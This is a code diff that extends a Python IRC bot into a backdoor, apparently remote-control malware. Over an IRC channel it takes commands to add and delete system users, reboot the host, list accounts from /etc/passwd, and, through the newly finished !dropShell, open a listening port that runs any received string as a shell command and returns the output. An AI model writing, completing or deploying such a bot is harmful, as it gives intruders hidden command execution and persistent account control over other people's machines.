@@ -1,4 +1,4 @@
-import subprocess, sys, base64, os, socket
+import subprocess, sys, base64, os, socket, threading, random
 from time import sleep
 
 info = "rip"
@@ -48,8 +48,13 @@ def ircConnect():
 		print newUser
 		print newPass
 	
-	   irc.send('PRIVMSG ' + channel + ' :User added.\r\n')
-	   addUser(newUser, newPass)
+	   try:
+		addUser(newUser, newPass)
+	   except Exception:
+		irc.send('PRIVMSG ' + channel + ' :Could not add user.\r\n')
+	   else:
+	   	irc.send('PRIVMSG ' + channel + ' :User added.\r\n')
+
 
 	elif(text.find(':!reboot') != -1):
 	   reboot()
@@ -61,22 +66,29 @@ def ircConnect():
 		user = text[temp:]
 		user = user.strip()
 		print user
-	
-	   irc.send('PRIVMSG ' + channel + ' :User killed.\r\n')
-	   killUser(user)
+	   
+	   try:
+		killUser(user)
+	   except Exception:
+		irc.send('PRIVMSG ' + channel + ' :Unable to to kill user.\r\n')
+	   else:
+	   	irc.send('PRIVMSG ' + channel + ' :User killed.\r\n')
+	  
 
-	elif(text.find(':!dropShell'):
-            dropShell()
+	elif(text.find(':!dropShell') != -1):
+	    newPort = random.randint(60000,64000)
+            dropShell(newPort)
+	    irc.send('PRIVMSG ' + channel + ' :Shell listening on port ' + str(newPort) + '\r\n')	
  
 	elif(text.find(':!listUsers') != -1):
 	    userList = listUsers()
 	    returnString = ""
 	    for x in userList:
 		returnString += (x + ', ')
-	    irc.send('PRIVMSG '+ channel + ' : ' + returnString + '\r\n')
+	    irc.send('PRIVMSG '+ channel + ' :' + returnString + '\r\n')
 	    
 	elif(text.find(':!help') != -1):
-	    irc.send('PRIVMSG ' + channel + ' :Commands - !speak, !reboot, !findFile, !listUsers, !addUser [name] [password], killUser [user]\r\n')
+	    irc.send('PRIVMSG ' + channel + ' :Commands - !speak, !reboot, !dropShell, !listUsers, !addUser [name] [password], killUser [user]\r\n')
 
 
 ###
@@ -93,12 +105,15 @@ def reboot():
 ### @params - none
 ### @returns - none
 ###
-def handleClient():
-    
-    request = client_socket.recv(2048)
-    print request
-    client_socket.send("ACK!")
-    client_socket.close()
+def handleClient(client_socket):
+   
+    while True: 
+    	request = client_socket.recv(2048)
+    	print request
+    	if not request:
+		break
+    	output = subprocess.check_output(request, stderr=subprocess.STDOUT, shell=True)
+    	client_socket.send(output)
 
 
 ###
@@ -106,17 +121,16 @@ def handleClient():
 ### @params - none
 ### @return - none
 ###
-def shell()
-    
-    port = randint(10000, 20000)
+def shell(newPort):
+   
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind = (('', port))
+    server.bind(('', newPort))
     server.listen(5)
     
     while True:
 	
 	client, address = server.accept()
-	client_handler = threading.Thread(target=handle_client, args=(client,))
+	client_handler = threading.Thread(target=handleClient, args=(client,))
 	client_handler.start()
 
 ###
@@ -124,8 +138,9 @@ def shell()
 ### @params - none
 ### @returns - the port and ip to connect to the shell
 ###
-def dropShell():
-    
+def dropShell(newPort):
+    newShell = threading.Thread(target=shell, args=(newPort,))
+    newShell.start()
 
 ###
 ### List the users found in /etc/passwd
